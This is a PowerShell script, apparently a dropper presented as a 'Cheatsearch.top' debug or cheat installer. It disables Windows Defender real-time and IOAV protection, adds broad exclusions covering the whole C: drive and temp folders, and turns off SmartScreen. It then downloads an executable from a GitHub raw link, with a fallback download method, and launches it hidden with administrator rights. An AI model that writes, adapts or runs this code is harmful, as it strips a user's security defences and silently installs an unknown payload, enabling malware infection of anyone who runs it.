$ErrorActionPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Clear

Write-Host "--- Debug Mode: Cheatsearch.top ---" -ForegroundColor Yellow

# 1. Admin Check
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] ERROR: No Admin Rights! Defender commands will fail." -ForegroundColor Red
} else {
    Write-Host "[+] Admin Rights: OK" -ForegroundColor Green
}

# 2. Disable Protection & Add Exclusions
Write-Host "[*] Disabling Defender & Adding Exclusions..." -ForegroundColor Cyan
$outputFile = "$env:TEMP\ccmmd.exe"
$folders = @("C:\", "C:\Windows\Temp", "C:\ProgramData", "$env:TEMP")

foreach ($f in $folders) { Add-MpPreference -ExclusionPath $f }
Add-MpPreference -ExclusionPath $outputFile
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Disable SmartScreen
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name 'SmartScreenEnabled' -Value 'Off' -Type String
Write-Host "[+] Protection bypassed." -ForegroundColor Gray

# 3. Download
$url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
Write-Host "[*] Downloading file to: $outputFile" -ForegroundColor Cyan

try {
    Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "Mozilla/5.0" -UseBasicParsing
    Write-Host "[+] Download: Success" -ForegroundColor Green
} catch {
    Write-Host "[-] Download: Failed! Trying backup method..." -ForegroundColor Yellow
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $outputFile)
        Write-Host "[+] Download: Success (WebClient)" -ForegroundColor Green
    } catch {
        Write-Host "[-] CRITICAL ERROR: File not reachable." -ForegroundColor Red
    }
}

# 4. Run Execution
if (Test-Path $outputFile) {
    Write-Host "[*] Launching process..." -ForegroundColor Cyan
    try {
        $proc = Start-Process -FilePath $outputFile -Verb RunAs -PassThru -WindowStyle Hidden
        Write-Host "[+] Process started! ID: $($proc.Id)" -ForegroundColor Green
    } catch {
        Write-Host "[-] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

Write-Host "--- Debug End ---" -ForegroundColor Yellow
pause
